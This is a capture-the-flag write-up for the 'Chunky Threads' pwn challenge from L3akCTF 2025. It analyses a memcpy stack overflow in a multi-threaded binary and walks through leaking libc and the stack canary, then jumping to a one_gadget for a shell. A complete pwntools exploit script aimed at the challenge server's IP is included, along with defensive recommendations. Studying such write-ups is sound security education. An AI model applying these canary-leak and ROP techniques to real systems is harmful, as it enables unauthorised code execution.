# Chunky Threads - L3akCTF 2025

**Category:** PWN  
**Difficulty:** Medium  
**Author:** dsp  

## Challenge Description

```
Give the chonk a chunk and he just gets chonkier.
Teach him to chunk and he will forestack smashing detected.
```

## Environment Setup

The challenge runs in a containerized environment with the following files:
- `chall`: Main binary executable
- `wrapper.sh`: Execution wrapper script
- `libc.so.6`: GNU C Library version 2.40

### Binary Protections

```bash
$ checksec chall
Arch:     amd64
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'/nix/store/hbc8c6fc17xnl85jxlcn9d4kxbyjj6il-shell/lib:/nix/store/cg9s562sa33k78m63njfn1rw47dp9z0i-glibc-2.40-66/lib:/nix/store/7c0v0kbrrdc2cqgisi78jdqxn73n3401-gcc-14.2.1.20250322-lib/lib'
Stripped: No
```

The binary has most protections enabled except PIE, making it suitable for return-oriented programming attacks.

## Vulnerability Analysis

### Program Architecture

The application implements a multi-threaded command processor with the following flow:
```
main() → parsecmd() → print() (pthread)
```

### Key Functions

#### 1. main() Function
- Initializes buffers and thread management
- Continuously reads commands from stdin
- Manages thread lifecycle with `pthread_join()`

#### 2. parsecmd() Function
Handles three types of commands:
- `CHUNKS n`: Sets the number of available threads (max 10)
- `CHUNK id timeout data`: Creates a new thread to print data
- `CHONK`: Displays an easter egg message

#### 3. print() Function (Thread Function)
```c
void *__fastcall print(void *a1)
{
    int v3;                    // [rsp+10h] [rbp-60h]
    unsigned int seconds;      // [rsp+14h] [rbp-5Ch]
    _QWORD dest[10];          // [rsp+20h] [rbp-50h] BYREF - 64 bytes

    dest[9] = __readfsqword(0x28u);  // Stack canary
    memset(dest, 0, 64);
    v3 = *((_DWORD *)a1 + 1);
    seconds = *(_DWORD *)a1;
    memcpy(dest, *((const void **)a1 + 1), *((_QWORD *)a1 + 2));  // VULNERABILITY
    while (v3--) {
        puts((const char *)dest);
        sleep(seconds);
    }
    return 0;
}
```

### The Vulnerability: Buffer Overflow in memcpy()

The critical vulnerability exists in the `print()` function:
```c
_QWORD dest[10];  // 64-byte buffer
memcpy(dest, message_ptr, message_len);  // No length validation
```

### Stack Layout
```
[rbp + 0x8]   <- Return Address
[   rbp   ]   <- Stack Frame Pointer  
[rbp - 0x8]   <- Stack Canary
    ...
[rbp - 0x50]  <- dest buffer [64 bytes]
```

### Overflow Conditions
- `message_len > 64`: Overwrites stack canary
- `message_len > 72`: Overwrites return address

## Exploitation Strategy

This challenge demonstrates a sophisticated multi-threaded exploitation technique that leverages several key concepts:

### 1. Multi-threaded Canary Sharing
- All threads within a process share the same stack canary value
- A canary leaked from one thread can be reused in another thread

### 2. Timing Attack with sleep()
- The `sleep()` function delays thread termination
- Canary validation occurs only when the function returns
- Long sleep times provide attack windows for other threads

### 3. Race Condition Exploitation  
- Main thread continues processing commands while worker threads sleep
- Multiple threads can be exploited simultaneously
- Enables staged attacks across different threads

## Exploitation Process

The attack consists of three stages executed across different threads:

### Stage 1: Libc Address Leak

![CHONK Command Output](https://github.com/user-attachments/assets/197267d8-509a-4b60-b8cf-9259dc032f82)

```python
# Stage 1: Leak libc base address
p.sendline(b'CHUNKS 3')
payload = b"CHUNK 0 1 " + b'a' * 0x3f  # Overflow to leak libc address
p.sendline(payload)
p.recvuntil(b'aaaaa\n')
leak = u64(p.recv(6) + b'\x00\x00')
libc_base = leak + 0x940 + 0x3000  # Remote offset adjustment
print(f"libc_base: {hex(libc_base)}")
```

**Analysis:**
- 63-byte overflow reaches stack data containing libc addresses
- The offset difference between local and remote environments is 0x3000
- Successfully leaks libc base for ASLR bypass

### Stage 2: Stack Canary Leak

```python
# Stage 2: Leak stack canary
payload = b"CHUNK 100 1 " + b'b' * 0x48  # Overflow to corrupt canary
p.sendline(payload)
p.recvuntil(b'b\n')
canary = u64(b'\x00' + p.recv(7))
print(f"canary: {hex(canary)}")
```

**Analysis:**
- 72-byte overflow corrupts the first byte of the canary
- `sleep(100)` provides 100 seconds for subsequent attacks
- `puts()` outputs the corrupted canary, revealing the original 7 bytes
- Stack canary typically starts with a null byte for string protection

### Stage 3: ROP Chain Execution

```python  
# Stage 3: Execute one_gadget via ROP
one_gadget = libc_base + 0x583ec
payload = b'CHUNK 0 1 ' + b'c' * 0x48 + p64(canary) + b'd' * 0x8 + p64(one_gadget)
p.send(payload)
```

**Analysis:**
- Uses the leaked canary to bypass stack protection
- 8-byte padding for proper stack alignment  
- one_gadget provides direct shell execution
- Thread immediately executes ROP chain

## Final Exploit

```python
from pwn import *

p = remote('34.45.81.67', 16006)
elf = ELF('./chall')
libc = ELF('./libc.so.6')

# Stage 1: Leak libc base address
p.sendline(b'CHUNKS 3')
payload = b"CHUNK 0 1 " + b'a' * 0x3f
p.sendline(payload)
p.recvuntil(b'aaaaa\n')
leak = u64(p.recv(6) + b'\x00\x00')
libc_base = leak + 0x940 + 0x3000
print(f"libc_base: {hex(libc_base)}")

# Stage 2: Leak stack canary  
payload = b"CHUNK 100 1 " + b'b' * 0x48
p.sendline(payload)
p.recvuntil(b'b\n')
canary = u64(b'\x00' + p.recv(7))
print(f"canary: {hex(canary)}")

# Stage 3: ROP chain with one_gadget
one_gadget = libc_base + 0x583ec
payload = b'CHUNK 0 1 ' + b'c' * 0x48 + p64(canary) + b'd' * 0x8 + p64(one_gadget)
p.send(payload)

p.interactive()
```

## Exploitation Result

![Exploit Success](https://github.com/user-attachments/assets/9d17851a-1009-4d14-9051-36eff5e30a60)

The exploit successfully achieves:
1. ✅ Libc base address leak for ASLR bypass
2. ✅ Stack canary extraction via timing attack  
3. ✅ Shell acquisition through one_gadget execution

## Key Takeaways

### Technical Insights
- **Multi-threaded Exploitation**: Leveraged shared canary values across threads
- **Timing-based Attacks**: Used `sleep()` to create exploitation windows
- **Race Condition Abuse**: Coordinated attacks across multiple thread contexts
- **Stack Protection Bypass**: Combined canary leak with precise ROP chain

### Security Implications
- Stack canaries provide limited protection in multi-threaded contexts
- Timing-based vulnerabilities can enable complex staged attacks
- Race conditions in concurrent programs require careful security analysis
- Defense-in-depth is crucial when individual protections can be bypassed

### Defensive Recommendations
- Implement proper bounds checking for all buffer operations
- Use thread-local canary values to prevent cross-thread leakage
- Add timeout protections to prevent extended exploitation windows
- Enable PIE to make ROP chain construction more difficult

**Flag:** `L3AK{[flag_content]}`